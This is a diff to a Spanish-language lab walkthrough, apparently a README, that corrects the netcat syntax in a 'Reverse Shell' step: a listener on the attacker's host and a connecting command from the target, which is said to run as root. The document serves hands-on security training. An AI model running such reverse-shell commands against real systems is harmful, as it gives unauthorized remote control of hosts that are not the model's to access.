@@ -29,7 +29,7 @@ Puedes descomprimir usando el comando: `unzip lab-app-compressed.zip`
 <img width="1195" height="679" alt="image" src="https://github.com/user-attachments/assets/1cfdd069-39f1-4506-a5e6-389277726619" />
 
 ## Paso 5: Reverse Shell
-Allí, con netcat, puedes iniciar una reverse shell: nc lvnp -4444 desde tu host y nc vnp 4444 desde el host externo, en la línea de comandos mostrada, adicionalmente, todo es viable, puesto que fue ejecutado como root.
+Allí, con netcat, puedes iniciar una reverse shell:  `nc -lvnp 4444 ` desde tu host y  `nc -vnp 4444 IP` desde el host externo, en la línea de comandos mostrada, adicionalmente, todo es viable, puesto que fue ejecutado como root.
 
 Suerte.
 At. Ana
